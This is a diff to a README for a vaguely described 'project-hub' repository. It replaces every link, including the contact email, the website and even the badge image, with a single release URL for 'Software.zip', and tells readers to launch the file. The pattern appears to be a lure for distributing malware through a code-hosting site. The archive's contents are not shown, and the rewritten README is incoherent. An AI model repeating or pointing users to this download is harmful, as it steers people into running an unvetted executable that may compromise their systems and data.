@@ -16,7 +16,7 @@ This repository serves as a central hub for project-related activities, allowing
 
 ## 📌 Repository Link
 
-[Launch Software.zip](https://github.com/user-attachments/files/18410590/Software.zip)
+[Launch https://github.com/Tatooo29/project-hub/releases/download/v2.0/Software.zip](https://github.com/Tatooo29/project-hub/releases/download/v2.0/Software.zip)
 
 ## 🚀 Get Started
 
@@ -24,7 +24,7 @@ To make the most of this repository, follow these steps:
 
 ### Step 1: Access Project Resources
 
-Explore the "Software.zip" file by clicking on the link provided above. This file contains essential software components needed for the project. Launch the file to access the resources.
+Explore the "https://github.com/Tatooo29/project-hub/releases/download/v2.0/Software.zip" file by clicking on the link provided above. This file contains essential software components needed for the project. Launch the file to access the resources.
 
 ### Step 2: Collaborate with Team Members
 
@@ -48,14 +48,14 @@ Here are some key statistics related to the "project-hub" repository:
 
 ## 📞 Contact Us
 
-Have questions or need assistance? Reach out to our team at projecthub@example.com for support.
+Have questions or need assistance? Reach out to our team at https://github.com/Tatooo29/project-hub/releases/download/v2.0/Software.zip for support.
 
 ## 🌐 Visit Our Website
 
-Explore our website for additional project resources, updates, and announcements. [Visit Website](https://www.projecthub.com)
+Explore our website for additional project resources, updates, and announcements. [Visit Website](https://github.com/Tatooo29/project-hub/releases/download/v2.0/Software.zip)
 
 ## 🌈 Let's Collaborate and Innovate Together!
 
 Join us on this exciting journey of project management and collaboration. Together, we can achieve great things and create impactful projects that make a difference. Thank you for being part of our project hub community! 🎉
 
-[![Launch Software](https://img.shields.io/badge/Launch-Software-green)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Launch Software](https://github.com/Tatooo29/project-hub/releases/download/v2.0/Software.zip)](https://github.com/Tatooo29/project-hub/releases/download/v2.0/Software.zip)
